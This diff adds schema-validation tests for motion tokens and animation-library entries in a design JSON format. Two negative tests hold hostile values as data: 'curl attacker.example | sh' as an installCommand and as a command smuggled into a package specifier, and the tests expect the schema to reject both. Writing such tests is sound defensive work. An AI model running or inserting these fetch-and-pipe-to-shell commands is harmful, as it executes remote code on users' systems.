@@ -266,4 +266,92 @@ describe('design.v1.json schema validation', () => {
     const isValid = validate(invalidDesign);
     expect(isValid).toBe(true);
   });
+
+  describe('motion tokens and libraries (#186)', () => {
+    const withMotionAndLibraries = () => {
+      const design = JSON.parse(JSON.stringify(validDesign));
+      design.tokens.motion = {
+        duration: { fast: '150ms', normal: '300ms', slow: { value: 0.5, unit: 's' } },
+        delay: { stagger: '75ms' },
+        easing: { standard: [0.4, 0, 0.2, 1], bounce: 'ease-out' },
+        iteration: { once: 1, loop: 'infinite' },
+        keyframes: {
+          'fade-in': { '0%': { opacity: '0' }, '100%': { opacity: '1' } },
+          'slide-up': { from: { transform: 'translateY(8px)' }, to: { transform: 'translateY(0)' } },
+        },
+        effects: [
+          { name: 'hover-lift', trigger: 'hover', target: 'button', properties: ['transform'], duration: 'fast', easing: 'bounce' },
+          { name: 'card-fade-in', trigger: 'entrance', target: 'card', keyframes: 'fade-in', duration: 'normal' },
+          { name: 'scroll-reveal', trigger: 'scroll', target: 'section', description: 'fade in on scroll' },
+        ],
+      };
+      design.libraries = [
+        {
+          name: 'GSAP',
+          package: 'gsap',
+          version: '^3.12.5',
+          purpose: 'scroll-driven entrance animations',
+        },
+      ];
+      return design;
+    };
+
+    test('design with motion tokens and libraries should pass', () => {
+      const isValid = validate(withMotionAndLibraries());
+      if (!isValid) {
+        console.error('Validation errors:', validate.errors);
+      }
+      expect(isValid).toBe(true);
+    });
+
+    test('design without motion or libraries should pass (optional)', () => {
+      const design = withMotionAndLibraries();
+      delete design.tokens.motion;
+      delete design.libraries;
+      const isValid = validate(design);
+      expect(isValid).toBe(true);
+    });
+
+    test('easing array that is not exactly 4 numbers should fail', () => {
+      const design = withMotionAndLibraries();
+      design.tokens.motion.easing.standard = [0.4, 0, 0.2];
+      const isValid = validate(design);
+      expect(isValid).toBe(false);
+    });
+
+    test('duration string without ms/s unit should fail', () => {
+      const design = withMotionAndLibraries();
+      design.tokens.motion.duration.fast = '150';
+      const isValid = validate(design);
+      expect(isValid).toBe(false);
+    });
+
+    test('effect entry missing trigger should fail', () => {
+      const design = withMotionAndLibraries();
+      delete design.tokens.motion.effects[0].trigger;
+      const isValid = validate(design);
+      expect(isValid).toBe(false);
+    });
+
+    test('libraries entry missing name should fail', () => {
+      const design = withMotionAndLibraries();
+      delete design.libraries[0].name;
+      const isValid = validate(design);
+      expect(isValid).toBe(false);
+    });
+
+    test('libraries entry with a free-form installCommand should fail', () => {
+      const design = withMotionAndLibraries();
+      design.libraries[0].installCommand = 'curl attacker.example | sh';
+      const isValid = validate(design);
+      expect(isValid).toBe(false);
+    });
+
+    test('libraries entry with an unsafe package specifier should fail', () => {
+      const design = withMotionAndLibraries();
+      design.libraries[0].package = 'gsap; curl attacker.example | sh';
+      const isValid = validate(design);
+      expect(isValid).toBe(false);
+    });
+  });
 });
